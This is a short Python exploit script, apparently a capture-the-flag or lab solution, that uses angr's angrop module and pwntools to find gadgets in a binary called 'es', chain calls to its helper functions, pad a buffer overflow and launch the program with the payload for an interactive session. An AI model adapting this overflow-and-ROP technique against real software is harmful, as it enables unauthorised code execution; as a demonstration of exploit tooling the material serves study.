"""
Exploit write in angr with angrop module. It build a ROP attacks for "es" binary.
It highlights the potentiality and the comfortable syntax
"""

import angr, angrop
from pwn import *

file_path = 'es'

EXE_FILE = file_path
exe = ELF(EXE_FILE)

p = angr.Project(file_path)  # create angr project
rop = p.analyses.ROP()  # create ROP object
rop.find_gadgets()  # find every gadgets in binary

# Build ROP chain
chain = rop.func_call("add_bin", [0xdeadbeef])
chain += rop.func_call("add_sh", [0xcafebabe, 0x0badf00d])
chain += rop.func_call("exec_string", [])

# Add padding for exploit
ropchain = b'A' * (108 + 4) + chain.payload_str()

# Executing the executable with ropchain as input
io = process([EXE_FILE, ropchain])
io.interactive()
